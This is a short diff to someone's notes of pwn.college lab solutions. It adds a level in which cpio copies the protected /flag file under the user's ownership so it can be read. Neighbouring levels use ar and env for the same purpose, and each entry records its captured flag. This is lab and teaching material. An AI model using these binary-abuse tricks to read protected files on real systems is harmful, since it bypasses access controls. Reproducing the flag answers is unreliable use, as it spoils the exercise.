@@ -95,6 +95,13 @@ pwn.college{A7I5HGI7_suJAVVule_cvW-B_zN.0lM2EDLwIzW}
 /bin/ar p /flag.a
 pwn.college{0VOQzQpy9LX-ycBn2AI0mXrM7Wg.01M2EDLwIzW}
 
+## Level22
+run the binary first
+mkdir /tmp/pwn
+echo "/flag" | /bin/cpio -R hacker -p /tmp/pwn
+cat /tmp/pwn/flag
+pwn.college{QA0disrgr2Wc5Ro9ffXdxUwF7n8.0FN2EDLwIzW}
+
 ## Level24
 /bin/env -i cat /flag
 pwn.college{0uj9Z12xXk2h4Q1B2rJedYDXxBx.0lN2EDLwIzW}
